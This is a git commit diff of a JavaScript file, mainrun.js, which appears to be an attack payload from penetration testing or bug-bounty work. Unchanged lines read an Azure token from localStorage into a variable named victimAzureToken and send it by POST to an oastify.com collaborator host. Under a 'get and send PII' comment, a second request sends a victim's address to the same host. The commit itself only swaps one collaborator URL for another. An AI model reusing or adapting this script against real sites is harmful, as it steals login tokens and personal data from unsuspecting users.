063ab033bb0f8eb3a8b6b248d449e75e33837f34
Jay3shh <jayesh921@gmail.com>
2023-08-28 19:42:54 +0530

    Update mainrun.js

--- mainrun.js
+++ mainrun.js
@@ -1,6 +1,6 @@
 var victimAzureToken=localStorage.getItem('azure_token');
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://e3i77kap4h339kkd36vsuu263x9oxel3.oastify.com", true);
+xhr.open("POST", "https://oxpeakb49l1hnme9naf9qmaqqhw8k18q.oastify.com", true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 xhr.onreadystatechange = function() {
@@ -28,7 +28,7 @@ xhr.onreadystatechange = function() {
     //get and send PII
     var reqBody = victimAddress;
     var xhrr = new XMLHttpRequest();
-    xhrr.open("POST", "https://e3i77kap4h339kkd36vsuu263x9oxel3.oastify.com", true);
+    xhrr.open("POST", "https://oxpeakb49l1hnme9naf9qmaqqhw8k18q.oastify.com", true);
     xhrr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     var requestBody = reqBody;
     xhrr.send(requestBody);
